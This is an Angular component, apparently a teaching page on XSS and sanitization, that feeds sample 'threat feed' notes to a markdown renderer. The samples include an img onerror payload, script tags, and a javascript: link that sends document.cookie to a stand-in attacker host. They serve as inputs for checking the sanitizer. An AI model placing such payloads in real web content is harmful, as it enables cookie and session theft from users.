import { Component, signal } from '@angular/core';
import { ThreatNote } from './threat-note';

const SAMPLES = [
  'C2 for **Botnets** campaign, seen at `203.0.113.66`. Details: [abuse report](https://example.org/report?id=42&src=aegis)',
  'Imported from partner feed: <img src=x onerror="alert(document.cookie)"> totally normal note',
  "Click [here](javascript:location='//evil.example/?'+document.cookie) for the IOC list",
  '<a href="javascript:alert(1)">raw link</a> and <script>alert(1)</script>',
];

@Component({
  selector: 'app-m26-01',
  imports: [ThreatNote],
  template: `
    <h1>Untrusted content <small class="muted">XSS & sanitization</small></h1>
    <textarea rows="3" class="editor" [value]="draft()" (input)="draft.set($any($event.target).value)"></textarea>
    <aegis-threat-note class="card" [markdown]="draft()" />
    <h3>Notes from the feed</h3>
    @for (s of samples; track $index) { <aegis-threat-note class="card" [markdown]="s" /> }
    <p class="muted">Open DevTools → Console: if any alert/onerror ever fires, you have an XSS.</p>
  `,
  styles: `.editor { width: 100%; } aegis-threat-note { display: block; margin: 8px 0; }`,
})
export class Page {
  protected readonly samples = SAMPLES;
  readonly draft = signal('Write a **note** with `code` and [a link](https://aegis.example)');
}
